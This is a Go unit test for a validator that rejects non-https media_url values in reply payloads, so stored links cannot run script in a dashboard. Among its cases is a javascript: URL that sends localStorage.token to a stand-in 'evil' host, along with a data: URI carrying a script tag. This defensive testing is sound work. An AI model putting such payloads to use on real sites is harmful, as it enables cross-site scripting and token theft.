package api

import "testing"

// agentReply refuses a reply payload whose media_url is not https — the payload
// is stored verbatim and the inbox renders media_url as an href, so a
// javascript: URL would run in the owner's dashboard origin. The rule used to
// be an inline condition in the handler (untestable without a database); it is
// now this function, and this test is what keeps it from being relaxed.
func TestUnsafeReplyMediaURL(t *testing.T) {
	cases := []struct {
		name    string
		payload map[string]any
		unsafe  bool
	}{
		{"no payload at all", nil, false},
		{"no media_url key", map[string]any{"kind": "media"}, false},
		{"empty media_url", map[string]any{"media_url": ""}, false},
		{"non-string media_url", map[string]any{"media_url": 42}, false},
		{"https", map[string]any{"media_url": "https://cdn.example.com/a.png"}, false},
		{"https uppercase scheme", map[string]any{"media_url": "HTTPS://cdn.example.com/a.png"}, false},
		{"http", map[string]any{"media_url": "http://cdn.example.com/a.png"}, true},
		{"javascript", map[string]any{"media_url": "javascript:fetch('https://evil/?t='+localStorage.token)"}, true},
		{"data uri", map[string]any{"media_url": "data:text/html,<script>alert(1)</script>"}, true},
		{"protocol relative", map[string]any{"media_url": "//evil.example.com/a.png"}, true},
		{"relative path", map[string]any{"media_url": "/uploads/a.png"}, true},
		{"https with leading whitespace", map[string]any{"media_url": " https://cdn.example.com/a.png"}, true},
	}
	for _, tc := range cases {
		if got := unsafeReplyMediaURL(tc.payload); got != tc.unsafe {
			t.Errorf("%s: unsafeReplyMediaURL = %v, want %v", tc.name, got, tc.unsafe)
		}
	}
}
